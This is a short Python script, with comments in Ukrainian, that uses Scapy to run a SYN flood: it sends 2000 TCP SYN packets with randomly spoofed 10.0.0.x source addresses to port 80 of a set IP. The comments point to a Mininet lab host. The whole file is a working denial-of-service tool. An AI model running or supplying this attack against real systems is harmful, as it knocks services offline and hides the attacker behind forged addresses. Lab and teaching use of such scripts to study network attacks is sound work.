from scapy.all import IP, TCP, send
import random
import time

target_ip = "192.168.1.102"      # IP цілі (наприклад, твій хост Mininet)
target_port = 80            # Порт цілі (можеш змінити на потрібний)
packet_count = 2000         # Кількість пакетів для відправки
delay = 0.01                # Затримка між пакетами (щоб не задудосити дуже швидко)

print(f"Starting SYN flood attack on {target_ip}:{target_port}...")

for i in range(packet_count):
    ip_layer = IP(src=f"10.0.0.{random.randint(2, 254)}", dst=target_ip)
    tcp_layer = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S", seq=random.randint(1000, 9000))
    packet = ip_layer / tcp_layer
    send(packet, verbose=False)
    time.sleep(delay)

print("Attack finished.")